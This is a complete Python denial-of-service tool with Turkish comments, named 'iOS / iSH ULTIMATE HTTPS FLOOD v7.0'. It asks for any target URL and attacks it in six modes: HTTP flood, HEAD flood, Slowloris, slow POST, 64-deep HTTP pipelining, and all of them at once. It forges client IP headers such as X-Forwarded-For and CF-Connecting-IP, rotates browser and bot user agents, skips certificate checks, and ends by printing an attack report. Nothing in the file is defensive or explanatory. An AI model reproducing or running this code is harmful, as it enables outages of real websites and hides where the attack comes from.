# -*- coding: utf-8 -*-
# iOS / iSH ULTIMATE HTTPS FLOOD v7.0
# requests + raw socket + threading - aiohttp YOK
# HTTP + HTTPS tam destekli, 6 farklı saldırı modu

import requests
import threading
import random
import time
import sys
import os
import socket
import ssl
from urllib.parse import urlparse

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

# ======================== UA HAVUZU ========================
UA_POOL = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "WhatsApp/2.23.24.76 A",
]

# ======================== IP HAVUZU ========================
IP_BLOCKS = [
    (1,0,0,0,1,255,255,255), (2,0,0,0,2,255,255,255), (5,0,0,0,5,255,255,255),
    (14,0,0,0,14,255,255,255), (23,0,0,0,23,255,255,255), (27,0,0,0,27,255,255,255),
    (31,0,0,0,31,255,255,255), (36,0,0,0,36,255,255,255), (37,0,0,0,37,255,255,255),
    (41,0,0,0,41,255,255,255), (42,0,0,0,42,255,255,255), (45,0,0,0,45,255,255,255),
    (49,0,0,0,49,255,255,255), (51,0,0,0,51,255,255,255), (58,0,0,0,58,255,255,255),
    (59,0,0,0,59,255,255,255), (60,0,0,0,60,255,255,255), (61,0,0,0,61,255,255,255),
    (62,0,0,0,62,255,255,255), (63,0,0,0,63,255,255,255), (64,0,0,0,64,255,255,255),
    (65,0,0,0,65,255,255,255), (66,0,0,0,66,255,255,255), (67,0,0,0,67,255,255,255),
    (68,0,0,0,68,255,255,255), (69,0,0,0,69,255,255,255), (70,0,0,0,70,255,255,255),
    (71,0,0,0,71,255,255,255), (72,0,0,0,72,255,255,255), (73,0,0,0,73,255,255,255),
    (74,0,0,0,74,255,255,255), (75,0,0,0,75,255,255,255), (76,0,0,0,76,255,255,255),
    (77,0,0,0,77,255,255,255), (78,0,0,0,78,255,255,255), (79,0,0,0,79,255,255,255),
    (80,0,0,0,80,255,255,255), (81,0,0,0,81,255,255,255), (82,0,0,0,82,255,255,255),
    (83,0,0,0,83,255,255,255), (84,0,0,0,84,255,255,255), (85,0,0,0,85,255,255,255),
    (86,0,0,0,86,255,255,255), (87,0,0,0,87,255,255,255), (88,0,0,0,88,255,255,255),
    (89,0,0,0,89,255,255,255), (90,0,0,0,90,255,255,255), (91,0,0,0,91,255,255,255),
    (92,0,0,0,92,255,255,255), (93,0,0,0,93,255,255,255), (94,0,0,0,94,255,255,255),
    (95,0,0,0,95,255,255,255), (101,0,0,0,101,255,255,255), (102,0,0,0,102,255,255,255),
    (103,0,0,0,103,255,255,255), (104,0,0,0,104,255,255,255), (105,0,0,0,105,255,255,255),
    (106,0,0,0,106,255,255,255), (107,0,0,0,107,255,255,255), (108,0,0,0,108,255,255,255),
    (109,0,0,0,109,255,255,255), (110,0,0,0,110,255,255,255), (111,0,0,0,111,255,255,255),
    (112,0,0,0,112,255,255,255), (113,0,0,0,113,255,255,255), (114,0,0,0,114,255,255,255),
    (115,0,0,0,115,255,255,255), (116,0,0,0,116,255,255,255), (117,0,0,0,117,255,255,255),
    (118,0,0,0,118,255,255,255), (119,0,0,0,119,255,255,255), (120,0,0,0,120,255,255,255),
    (121,0,0,0,121,255,255,255), (122,0,0,0,122,255,255,255), (123,0,0,0,123,255,255,255),
    (124,0,0,0,124,255,255,255), (125,0,0,0,125,255,255,255), (139,0,0,0,139,255,255,255),
    (140,0,0,0,140,255,255,255), (141,0,0,0,141,255,255,255), (142,0,0,0,142,255,255,255),
    (143,0,0,0,143,255,255,255), (144,0,0,0,144,255,255,255), (146,0,0,0,146,255,255,255),
    (147,0,0,0,147,255,255,255), (148,0,0,0,148,255,255,255), (149,0,0,0,149,255,255,255),
    (150,0,0,0,150,255,255,255), (151,0,0,0,151,255,255,255), (152,0,0,0,152,255,255,255),
    (153,0,0,0,153,255,255,255), (154,0,0,0,154,255,255,255), (155,0,0,0,155,255,255,255),
    (156,0,0,0,156,255,255,255), (157,0,0,0,157,255,255,255), (158,0,0,0,158,255,255,255),
    (159,0,0,0,159,255,255,255), (160,0,0,0,160,255,255,255), (161,0,0,0,161,255,255,255),
    (162,0,0,0,162,255,255,255), (163,0,0,0,163,255,255,255), (164,0,0,0,164,255,255,255),
    (165,0,0,0,165,255,255,255), (166,0,0,0,166,255,255,255), (167,0,0,0,167,255,255,255),
    (168,0,0,0,168,255,255,255), (169,0,0,0,169,255,255,255), (170,0,0,0,170,255,255,255),
    (171,0,0,0,171,255,255,255), (172,0,0,0,172,255,255,255), (173,0,0,0,173,255,255,255),
    (174,0,0,0,174,255,255,255), (175,0,0,0,175,255,255,255), (176,0,0,0,176,255,255,255),
    (177,0,0,0,177,255,255,255), (178,0,0,0,178,255,255,255), (179,0,0,0,179,255,255,255),
    (180,0,0,0,180,255,255,255), (181,0,0,0,181,255,255,255), (182,0,0,0,182,255,255,255),
    (183,0,0,0,183,255,255,255), (184,0,0,0,184,255,255,255), (185,0,0,0,185,255,255,255),
    (186,0,0,0,186,255,255,255), (187,0,0,0,187,255,255,255), (188,0,0,0,188,255,255,255),
    (189,0,0,0,189,255,255,255), (190,0,0,0,190,255,255,255), (191,0,0,0,191,255,255,255),
    (192,0,0,0,192,255,255,255), (193,0,0,0,193,255,255,255), (194,0,0,0,194,255,255,255),
    (195,0,0,0,195,255,255,255), (196,0,0,0,196,255,255,255), (197,0,0,0,197,255,255,255),
    (198,0,0,0,198,255,255,255), (199,0,0,0,199,255,255,255), (200,0,0,0,200,255,255,255),
    (201,0,0,0,201,255,255,255), (202,0,0,0,202,255,255,255), (203,0,0,0,203,255,255,255),
    (204,0,0,0,204,255,255,255), (205,0,0,0,205,255,255,255), (206,0,0,0,206,255,255,255),
    (207,0,0,0,207,255,255,255), (208,0,0,0,208,255,255,255), (209,0,0,0,209,255,255,255),
    (210,0,0,0,210,255,255,255), (211,0,0,0,211,255,255,255), (212,0,0,0,212,255,255,255),
    (213,0,0,0,213,255,255,255), (214,0,0,0,214,255,255,255), (215,0,0,0,215,255,255,255),
    (216,0,0,0,216,255,255,255), (217,0,0,0,217,255,255,255), (218,0,0,0,218,255,255,255),
    (219,0,0,0,219,255,255,255), (220,0,0,0,220,255,255,255), (221,0,0,0,221,255,255,255),
    (222,0,0,0,222,255,255,255), (223,0,0,0,223,255,255,255),
]

def random_ip():
    b = random.choice(IP_BLOCKS)
    return f"{random.randint(b[0], b[4])}.{random.randint(b[1], b[5])}.{random.randint(b[2], b[6])}.{random.randint(b[3], b[7])}"

PATHS = [
    "/", "/index.html", "/index.php", "/index.htm", "/default.html",
    "/home", "/main", "/start",
    "/api", "/api/v1", "/api/v2", "/api/json",
    "/login", "/signin", "/auth", "/register", "/signup",
    "/search", "/find", "/query",
    "/user", "/users", "/profile", "/account", "/admin", "/dashboard",
    "/products", "/shop", "/cart", "/checkout", "/payment",
    "/blog", "/news", "/article", "/feed", "/rss",
    "/contact", "/about", "/help", "/faq",
    "/assets/js/main.js", "/assets/css/style.css",
    "/images/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/wp-admin", "/wp-login.php", "/wp-json/wp/v2/posts", "/xmlrpc.php",
    "/.env", "/.git/config", "/config.php", "/phpinfo.php",
    "/admin.php", "/login.php", "/upload.php",
    "/cgi-bin/", "/server-status",
]

PARAMS = ["id","page","q","search","query","user","name","file","path",
          "url","redirect","callback","token","key","api_key","debug",
          "action","type","cat","category","lang","ref","src","target"]

def random_path():
    p = random.choice(PATHS)
    if random.random() < 0.85:
        n = random.randint(1, 3)
        qs = "&".join(f"{random.choice(PARAMS)}={random.randint(1,999999999)}" for _ in range(n))
        p += "?" + qs
    return p

def make_headers(host):
    ip = random_ip()
    return {
        "User-Agent": random.choice(UA_POOL),
        "Accept": random.choice(["*/*","text/html,application/xhtml+xml,*/*;q=0.8","application/json,*/*","image/avif,image/webp,*/*"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9","tr-TR,tr;q=0.9","de-DE,de;q=0.8","fr-FR,fr;q=0.7","es-ES,es;q=0.6","ru-RU,ru;q=0.5"]),
        "Accept-Encoding": random.choice(["gzip, deflate", "gzip, deflate, br", "identity"]),
        "Connection": random.choice(["keep-alive","keep-alive","close"]),
        "Cache-Control": random.choice(["no-cache","no-store","max-age=0"]),
        "Pragma": "no-cache",
        "DNT": random.choice(["1","0"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document","empty","script","image"]),
        "Sec-Fetch-Mode": random.choice(["navigate","no-cors","cors"]),
        "Sec-Fetch-Site": random.choice(["none","same-origin","cross-site"]),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "X-Originating-IP": ip,
        "X-Remote-IP": ip,
        "X-Client-IP": ip,
        "X-Host": ip,
        "Forwarded": f"for={ip}",
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
        "Fastly-Client-IP": ip,
        "Referer": f"https://{random.choice(['google.com','bing.com','yandex.com','duckduckgo.com','facebook.com','twitter.com'])}/",
        "Origin": f"https://{host}",
    }

# ======================== İSTATİSTİK ========================
class Stats:
    def __init__(self):
        self.sent = 0
        self.ok = 0
        self.fail = 0
        self.bytes = 0
        self.start = time.time()
        self.peak = 0
        self.codes = {}
        self.lock = threading.Lock()
    def inc(self, ok=True, size=0, code=None):
        with self.lock:
            self.sent += 1
            if ok: self.ok += 1
            else: self.fail += 1
            self.bytes += size
            if code: self.codes[code] = self.codes.get(code, 0) + 1
    def snap(self):
        with self.lock:
            e = time.time() - self.start
            rps = self.sent / e if e > 0 else 0
            if rps > self.peak: self.peak = rps
            return self.sent, self.ok, self.fail, self.bytes, rps, self.peak, dict(self.codes)

stats = Stats()

# ======================== KONFİG ========================
class Config:
    URL = ""
    HOST = ""
    PORT = 80
    HTTPS = False
    RPS = 100
    DURATION = 60
    THREADS = 30
    TIMEOUT = 10
    MODE = "http"

# ======================== SESSION (thread-local) ========================
_tls = threading.local()

def get_session():
    if not hasattr(_tls, "s"):
        s = requests.Session()
        s.headers.clear()
        # SSL bypass
        s.verify = False
        # Connection pool ayarları
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,
            pool_block=False
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _tls.s = s
    return _tls.s

# ======================== HTTP/HTTPS FLOOD ========================
def fire_one():
    try:
        s = get_session()
        method = random.choice(["GET","GET","GET","GET","POST","HEAD","OPTIONS","PUT"])
        target = Config.URL.rstrip("/") + random_path()
        headers = make_headers(Config.HOST)
        
        if method in ("POST","PUT"):
            size = random.randint(64, 4096)
            payload = os.urandom(size)
            headers["Content-Type"] = random.choice([
                "application/x-www-form-urlencoded",
                "application/json",
                "application/octet-stream",
                "text/plain",
            ])
            r = s.request(method, target, headers=headers, data=payload,
                          timeout=Config.TIMEOUT, allow_redirects=False)
            stats.inc(True, len(payload), r.status_code)
        else:
            r = s.request(method, target, headers=headers,
                          timeout=Config.TIMEOUT, allow_redirects=False)
            stats.inc(True, 0, r.status_code)
    except Exception:
        stats.inc(False)

def http_worker(stop_flag):
    while not stop_flag[0]:
        fire_one()

def http_rate_worker(stop_flag, rate_per):
    interval = 1.0 / rate_per if rate_per > 0 else 0
    next_t = time.time()
    while not stop_flag[0]:
        now = time.time()
        if now < next_t:
            time.sleep(next_t - now)
        threading.Thread(target=fire_one, daemon=True).start()
        next_t += interval
        if next_t < time.time() - 1:
            next_t = time.time()

# ======================== SLOWLORIS ========================
def slowloris(stop_flag, connections=300):
    host = Config.HOST
    port = Config.PORT
    use_ssl = Config.HTTPS
    sockets = []
    
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    
    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if use_ssl:
                s = ctx.wrap_socket(s, server_hostname=host)
            req = (
                f"GET {random_path()} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Accept: */*\r\n"
                f"X-Forwarded-For: {random_ip()}\r\n"
            )
            s.send(req.encode())
            sockets.append(s)
            stats.inc(True)
        except Exception:
            stats.inc(False)
    
    for _ in range(connections):
        if stop_flag[0]: break
        open_one()
    
    print(f"\n[+] Slowloris: {len(sockets)} bağlantı açıldı")
    
    while not stop_flag[0]:
        for s in list(sockets):
            try:
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,99999)}\r\n".encode())
                stats.inc(True)
            except Exception:
                sockets.remove(s)
                if len(sockets) < connections:
                    open_one()
        time.sleep(10)
    
    for s in sockets:
        try: s.close()
        except: pass

# ======================== SLOW POST ========================
def slow_post(stop_flag, connections=150):
    host = Config.HOST
    port = Config.PORT
    use_ssl = Config.HTTPS
    sockets = []
    
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    
    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            if use_ssl:
                s = ctx.wrap_socket(s, server_hostname=host)
            length = random.randint(1000000, 9999999)
            req = (
                f"POST {random_path()} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {length}\r\n"
                f"X-Forwarded-For: {random_ip()}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            sockets.append(s)
            stats.inc(True)
        except Exception:
            stats.inc(False)
    
    for _ in range(connections):
        if stop_flag[0]: break
        open_one()
    
    print(f"\n[+] Slow POST: {len(sockets)} bağlantı açıldı")
    
    while not stop_flag[0]:
        for s in list(sockets):
            try:
                s.send(os.urandom(1))
                stats.inc(True, 1)
            except Exception:
                sockets.remove(s)
        time.sleep(5)
    
    for s in sockets:
        try: s.close()
        except: pass

# ======================== HTTP PIPELINING ========================
def pipeline_worker(stop_flag, depth=64):
    host = Config.HOST
    port = Config.PORT
    use_ssl = Config.HTTPS
    
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    
    while not stop_flag[0]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            if use_ssl:
                s = ctx.wrap_socket(s, server_hostname=host)
            
            reqs = b""
            for _ in range(depth):
                reqs += (
                    f"GET {random_path()} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(UA_POOL)}\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
            s.send(reqs)
            stats.inc(True, len(reqs))
            try:
                s.recv(65536)
            except Exception:
                pass
            s.close()
        except Exception:
            stats.inc(False)

# ======================== HEAD FLOOD (hafif istek) ========================
def head_worker(stop_flag):
    while not stop_flag[0]:
        try:
            s = get_session()
            target = Config.URL.rstrip("/") + random_path()
            r = s.head(target, headers=make_headers(Config.HOST),
                       timeout=Config.TIMEOUT, allow_redirects=False)
            stats.inc(True, 0, r.status_code)
        except Exception:
            stats.inc(False)

# ======================== RAPOR ========================
def reporter(stop_flag):
    while not stop_flag[0]:
        time.sleep(1)
        s, ok, f, b, rps, peak, codes = stats.snap()
        bar_len = 25
        fill = int((rps / peak) * bar_len) if peak > 0 else 0
        bar = "█" * fill + "░" * (bar_len - fill)
        top = " ".join(f"{k}:{v}" for k, v in list(codes.items())[:4])
        sys.stdout.write(
            f"\r[DOS] Sent:{s:>8,} OK:{ok:>8,} Fail:{f:>6,} "
            f"RPS:{rps:>6.0f} Peak:{peak:>6.0f} BW:{b/1024/1024:>5.1f}MB [{bar}] {top}"
        )
        sys.stdout.flush()

# ======================== MOD SEÇİCİ ========================
def run_http():
    print(f"\n[*] HTTP flood başlatıldı - {Config.THREADS} thread")
    stop = [False]
    rate_per = Config.RPS / Config.THREADS
    workers = [threading.Thread(target=http_rate_worker, args=(stop, rate_per), daemon=True)
               for _ in range(Config.THREADS)]
    for w in workers: w.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(1)

def run_head():
    print(f"\n[*] HEAD flood başlatıldı - {Config.THREADS} thread")
    stop = [False]
    workers = [threading.Thread(target=head_worker, args=(stop,), daemon=True)
               for _ in range(Config.THREADS)]
    for w in workers: w.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(1)

def run_slowloris():
    stop = [False]
    t = threading.Thread(target=slowloris, args=(stop, 300), daemon=True)
    t.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(1)

def run_slowpost():
    stop = [False]
    t = threading.Thread(target=slow_post, args=(stop, 150), daemon=True)
    t.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(1)

def run_pipeline():
    print(f"\n[*] HTTP Pipelining başlatıldı - {Config.THREADS} thread x 64 derinlik")
    stop = [False]
    workers = [threading.Thread(target=pipeline_worker, args=(stop, 64), daemon=True)
               for _ in range(Config.THREADS)]
    for w in workers: w.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(1)

def run_mixed():
    print("\n[!] MIXED MODE - Tüm teknikler aynı anda\n")
    stop = [False]
    threads = []
    
    # HTTP flood
    rate_per = Config.RPS / max(Config.THREADS, 1)
    for _ in range(Config.THREADS // 2):
        threads.append(threading.Thread(target=http_rate_worker, args=(stop, rate_per), daemon=True))
    
    # HEAD flood
    for _ in range(Config.THREADS // 4):
        threads.append(threading.Thread(target=head_worker, args=(stop,), daemon=True))
    
    # Pipeline
    for _ in range(Config.THREADS // 4):
        threads.append(threading.Thread(target=pipeline_worker, args=(stop, 64), daemon=True))
    
    # Slowloris + Slow POST
    threads.append(threading.Thread(target=slowloris, args=(stop, 200), daemon=True))
    threads.append(threading.Thread(target=slow_post, args=(stop, 100), daemon=True))
    
    for t in threads: t.start()
    rep = threading.Thread(target=reporter, args=(stop,), daemon=True)
    rep.start()
    time.sleep(Config.DURATION)
    stop[0] = True
    time.sleep(2)

# ======================== BANNER + GİRİŞ ========================
BANNER = """
╔══════════════════════════════════════════════════════════════════╗
║  iOS / iSH ULTIMATE HTTPS FLOOD v7.0                             ║
║  requests + socket + threading - aiohttp GEREKMEZ                ║
║  HTTP + HTTPS tam destekli                                       ║
╚══════════════════════════════════════════════════════════════════╝

MODLAR:
  [1] HTTP Flood (paralel thread - hızlı)
  [2] HEAD Flood (hafif istek - daha hızlı)
  [3] Slowloris (bağlantı tutma - düşük CPU)
  [4] Slow POST (yavaş gövde - tek bağlantı)
  [5] HTTP Pipelining (64 derinlik toplu istek)
  [6] MIXED (hepsi aynı anda - EN GÜÇLÜ)
"""

def main():
    print(BANNER)
    
    url = input("Hedef URL (http:// veya https://): ").strip()
    if not url:
        print("[!] URL boş"); return
    if not url.startswith(("http://","https://")):
        url = "http://" + url
    
    p = urlparse(url)
    Config.URL = url.rstrip("/")
    Config.HOST = p.hostname
    Config.HTTPS = p.scheme == "https"
    Config.PORT = p.port or (443 if Config.HTTPS else 80)
    
    # DNS test
    try:
        ip = socket.gethostbyname(Config.HOST)
        print(f"[+] {Config.HOST} -> {ip} ({'HTTPS' if Config.HTTPS else 'HTTP'})")
    except Exception as e:
        print(f"[!] DNS hatası: {e}")
        return
    
    try:
        Config.RPS = int(input("Saniyede kaç istek? (iSH için 50-500): ") or "100")
    except: Config.RPS = 100
    
    try:
        Config.DURATION = int(input("Süre (saniye): ") or "60")
    except: Config.DURATION = 60
    
    try:
        Config.THREADS = int(input("Thread sayısı (10-100): ") or "30")
    except: Config.THREADS = 30
    
    print(f"\n--- MOD SEÇ ---")
    print("[1] HTTP Flood")
    print("[2] HEAD Flood")
    print("[3] Slowloris")
    print("[4] Slow POST")
    print("[5] HTTP Pipelining")
    print("[6] MIXED (EN GÜÇLÜ)")
    
    try:
        m = int(input("Mod [1-6] (varsayılan 6): ") or "6")
    except: m = 6
    
    modes = {1:"http",2:"head",3:"slowloris",4:"slowpost",5:"pipeline",6:"mixed"}
    Config.MODE = modes.get(m, "mixed")
    
    print(f"\n--- KONFİG ---")
    print(f"URL    : {Config.URL}")
    print(f"Host   : {Config.HOST}:{Config.PORT}")
    print(f"Protokol: {'HTTPS' if Config.HTTPS else 'HTTP'}")
    print(f"RPS    : {Config.RPS}")
    print(f"Süre   : {Config.DURATION}s")
    print(f"Thread : {Config.THREADS}")
    print(f"Mod    : {Config.MODE.upper()}")
    print()
    
    input("ENTER = başlat...")
    print()
    
    try:
        if Config.MODE == "http": run_http()
        elif Config.MODE == "head": run_head()
        elif Config.MODE == "slowloris": run_slowloris()
        elif Config.MODE == "slowpost": run_slowpost()
        elif Config.MODE == "pipeline": run_pipeline()
        elif Config.MODE == "mixed": run_mixed()
    except KeyboardInterrupt:
        print("\n[!] Durduruldu")
    
    # Final rapor
    s, ok, f, b, rps, peak, codes = stats.snap()
    print(f"\n\n===== SALDIRI RAPORU =====")
    print(f"Gönderilen  : {s:,}")
    print(f"Başarılı    : {ok:,}")
    print(f"Hatalı      : {f:,}")
    print(f"Toplam veri : {b/1024/1024:.2f} MB")
    print(f"Süre        : {time.time() - stats.start:.1f}s")
    print(f"Ortalama RPS: {rps:.0f}")
    print(f"Peak RPS    : {peak:.0f}")
    if codes:
        print(f"Durum kodları: {codes}")
    print(f"==========================")

if __name__ == "__main__":
    main()